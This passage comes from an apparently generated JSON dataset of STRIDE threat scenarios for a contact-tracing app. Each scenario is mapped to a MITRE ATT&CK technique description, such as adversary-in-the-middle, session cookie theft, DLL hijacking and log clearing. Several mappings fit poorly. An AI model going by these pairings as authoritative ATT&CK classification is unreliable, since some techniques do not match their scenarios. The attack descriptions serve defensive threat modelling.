                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Stored logs containing sensitive user interactions could be accessed by unauthorized personnel.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not encrypted at rest.",
                    "Role": "System Administrator",
                    "Condition": "Lack of data encryption."
                },
                {
                    "Assumption": "Access controls are weak or poorly implemented.",
                    "Role": "Security Officer",
                    "Condition": "Inadequate access control policies."
                },
                {
                    "Assumption": "Logs contain sensitive information beyond operational metadata.",
                    "Role": "Application Developer",
                    "Condition": "Overly detailed logging."
                }
            ],
            "Potential Impact": "Unauthorized exposure of user interactions, potential privacy violations.",
            "MITRE ATT&CK Keywords": [
                "log access",
                "unauthorized personnel",
                "sensitive data",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A breach in the central server could reveal user location data and interaction history.",
            "Assumptions": [
                {
                    "Assumption": "The central server is a high-value target for attackers.",
                    "Role": "Attacker",
                    "Condition": "Interest in user data."
                },
                {
                    "Assumption": "Security measures on the server are weak or contain vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate server security."
                },
                {
                    "Assumption": "Sensitive data is not adequately protected with encryption or other security mechanisms.",
                    "Role": "Application Developer",
                    "Condition": "Lack of data protection."
                }
            ],
            "Potential Impact": "Significant privacy risks, exposure of interaction history and location.",
            "MITRE ATT&CK Keywords": [
                "server breach",
                "information disclosure",
                "sensitive data",
                "location data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware could disable the mobile application, leading to a denial of service for users.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack robust anti-malware protections.",
                    "Role": "End User",
                    "Condition": "Poor security measures."
                },
                {
                    "Assumption": "The application lacks mechanisms to recover from malware disruptions.",
                    "Role": "Application Developer",
                    "Condition": "Inadequate recovery mechanisms."
                },
                {
                    "Assumption": "The attacker can deliver malware to user devices.",
                    "Role": "Attacker",
                    "Condition": "Existing delivery methods or vulnerabilities."
                }
            ],
            "Potential Impact": "Reduced availability of the application, disruption in contact tracing.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "denial of service",
                "mobile device",
                "application disruption"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A DDoS attack on the central server can prevent access to contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "The central server is not adequately protected against high-traffic attacks.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient DDoS protections."
                },
                {
                    "Assumption": "Attackers have the capability to generate significant network traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to botnet resources."
                },
                {
                    "Assumption": "The application depends heavily on real-time access to the server.",
                    "Role": "System Architect",
                    "Condition": "Design dependency."
                }
            ],
            "Potential Impact": "Decreased system availability, loss of timely contact tracing and alerting.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "server overload",
                "network traffic",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker can exploit vulnerabilities in the application to crash it repeatedly.",
            "Assumptions": [
                {
                    "Assumption": "The application contains exploitable vulnerabilities.",
                    "Role": "Application Developer",
                    "Condition": "Presence of known or unknown bugs."
                },
                {
                    "Assumption": "The attacker has knowledge of these vulnerabilities and the means to exploit them.",
                    "Role": "Attacker",
                    "Condition": "Access to exploit information."
                },
                {
                    "Assumption": "The application lacks automated patching or quick response mechanisms to vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient patch management."
                }
            ],
            "Potential Impact": "Frequent application crashes, reduced service availability for users.",
            "MITRE ATT&CK Keywords": [
                "application crash",
                "exploits",
                "denial of service",
                "vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware on a device could exploit the application to gain unauthorized access to sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "The application has permission management vulnerabilities.",
                    "Role": "Application Developer",
                    "Condition": "Faulty permission handling."
                },
                {
                    "Assumption": "Malware is able to install itself on user devices.",
                    "Role": "Attacker",
                    "Condition": "Existing compromise or social engineering."
                },
                {
                    "Assumption": "Anti-malware measures are weak or non-existent.",
                    "Role": "End User",
                    "Condition": "Lack of robust security measures."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user data, potential breach of data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "elevation of privilege",
                "unauthorized access",
                "mobile device"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider with legitimate access could escalate their privileges to access restricted data or functions.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are not properly enforced within the application.",
                    "Role": "System Administrator",
                    "Condition": "Poor access control policies."
                },
                {
                    "Assumption": "The insider has legitimate but limited access to the system.",
                    "Role": "Insider Threat",
                    "Condition": "Authorized access."
                },
                {
                    "Assumption": "The application does not have effective monitoring and auditing mechanisms.",
                    "Role": "Security Officer",
                    "Condition": "Lack of thorough monitoring."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive or restricted areas, potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "insider threat",
                "restricted access",
                "unauthorized use"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting a vulnerability in the application, an attacker could gain admin-level access to the central server.",
            "Assumptions": [
                {
                    "Assumption": "There exists a vulnerability in the application that allows privilege escalation.",
                    "Role": "Application Developer",
                    "Condition": "Unpatched vulnerability."
                },
                {
                    "Assumption": "The attacker has the capability to identify and exploit this vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Technical expertise and tools."
                },
                {
                    "Assumption": "The central server lacks sufficient security hardening.",
                    "Role": "System Administrator",
                    "Condition": "Weak server security."
                }
            ],
            "Potential Impact": "Root-level access to central server, complete control over system operations, potential data compromise.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "server vulnerability",
                "admin access",
                "unauthorized control"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "19",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the identity of a COVID-19 positive individual to cause unnecessary panic among other users.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to a device running the contact tracing app",
                    "Role": "Attacker",
                    "Condition": "The attacker needs to control a device to spoof identities."
                },
                {
                    "Assumption": "The attacker understands the protocol for generating temporary IDs",
                    "Role": "Attacker",
                    "Condition": "The attacker must reverse-engineer the app."
                },
                {
                    "Assumption": "The system does not have strong identity verification mechanisms",
                    "Role": "System Designer",
                    "Condition": "Lack of multi-factor authentication."
                }
            ],
            "Potential Impact": "Unauthorized disclosure, disruption of service, and unnecessary panic.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity",
                "phishing",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could forge Bluetooth signals to create fake contact events between devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has a device capable of forging Bluetooth signals",
                    "Role": "Attacker",
                    "Condition": "The attacker uses a specialized tool/device."
                },
                {
                    "Assumption": "The application's Bluetooth communication lacks encryption",
                    "Role": "System Designer",
                    "Condition": "Weak or no encryption methods used."
                },
                {
                    "Assumption": "The victim's device is within close proximity of the attacker's device",
                    "Role": "Victim",
                    "Condition": "Within the effective range of Bluetooth."
                }
            ],
            "Potential Impact": "Tampering with data integrity, creation of false data records.",
            "MITRE ATT&CK Keywords": [
                "bluetooth",
                "spoofing",
                "proxy",
                "mitm"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could gain unauthorized access by spoofing legitimate user credentials in a centralized system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to stolen credentials or can guess easily guessable passwords",
                    "Role": "Attacker",
                    "Condition": "Weak password policies."
                },
                {
                    "Assumption": "Two-factor authentication is not enforced",
                    "Role": "System Designer",
                    "Condition": "Lack of multi-factor authentication."
                },
                {
                    "Assumption": "The attacker can capture network traffic to gather login details",
                    "Role": "Attacker",
                    "Condition": "Use of unsecured networks by users."
                }
            ],
            "Potential Impact": "Compromise of data confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "phishing",
                "man-in-the-middle",
                "spoofing"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with incoming data to the central server in a centralized architecture.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access between the users and the central server",
                    "Role": "Attacker",
                    "Condition": "Presence in the same local network or internet dibers."
                },
                {
                    "Assumption": "Data encryption between devices and servers is weak or absent",
                    "Role": "System Designer",
                    "Condition": "Lack of robust encryption protocols."
                },
                {
                    "Assumption": "The server does not authenticate data sources properly",
                    "Role": "System Designer",
                    "Condition": "No verification mechanisms implemented."
                }
            ],
            "Potential Impact": "Data corruption and loss of data integrity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data manipulation",
                "packet capture",
                "network traffic"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters log files to erase their traces of unauthorized access or data modification.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained elevated privileges on the server",
                    "Role": "Attacker",
                    "Condition": "Exploited vulnerability or using stolen admin credentials."
                },
                {
                    "Assumption": "Log files are not write-protected",
                    "Role": "System Designer",
                    "Condition": "No mechanisms to protect log file integrity."
                },
                {
                    "Assumption": "Log file changes are not monitored",
                    "Role": "System Designer",
                    "Condition": "Lack of log change monitoring systems."
                }
            ],
            "Potential Impact": "Loss of audit trail, challenges in non-repudiation.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "log manipulation",
                "non-repudiation",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "Clear Network Connection History and Configurations",
                "description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
                "id": "attack-pattern--3975dbb5-0e1e-4f5b-bae1-cf2ab84b46dc",
                "technique_id": "T1070.007"
            }
        },
        {
            "Threat Type": "Tampering",
